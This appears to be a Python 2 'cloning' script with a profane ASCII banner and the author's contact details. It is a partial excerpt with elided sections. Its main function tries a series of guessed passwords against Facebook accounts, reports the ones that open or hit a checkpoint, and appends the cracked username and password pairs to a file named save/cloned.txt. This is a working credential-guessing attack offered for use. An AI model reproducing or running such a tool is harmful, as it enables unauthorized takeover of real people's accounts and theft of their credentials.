# WARNING TEAM # ANEEX# HACK#!/usr/bin/python2
#coding=utf-8
...
print  """
             ...
             o           o          o    o__ __o__/_   o__ __o__/_  \o       o/ 
            <|>         <|\        <|>  <|    v       <|    v        v\     /v  
            / \         / \\o      / \  < >           < >             <\   />   
          o/   \o       \o/ v\     \o/   |             |                \o/     
         <|__ __|>       |   <\     |    o__/_         o__/_             |      
 ...
 \033[1;91m   FUCK UUU HATERS 
 
 
 
\033[1;96m---------------------ANEEX-RXJX---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m ANEEX RXJX.                                
\033[0;91m║\033[0;91m FB :\033[0;92m "ANEEX RXJX"                                             
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;99m If you face any problem contact me on Whatsapp +923156675789💜
 
\033[1;96m------------------A  N  E  E  X----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mANEEX RXJX.                                   
...
\033[1;91m 🔴━━━❖❖A  N  E  E  X - R  X  J  X)❖❖━━━━🔴
\033[1;91m ANEES RAJA    UMMMMAH
 
\033[1;96m--------------------- A🚫N--------------------
 
    
 
\033[1;95mTAWADA OFFICAIL PAOO ANEEX RXJX”

                                                
\033[1;96m--------------------- A  N  E  E  X -R  X  J  X --------------------
"""
CorrectUsername = "ANEEX"
CorrectPassword = "RXJX"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://wa.me/+923156675789 ')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/AneexAwaix0011 ')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(-OPEN)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(-OPEN) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(-OPEN)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m(aftr-7-open)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(-OPEN) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(-OPEN)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(LOCK-) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(LOCK-)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
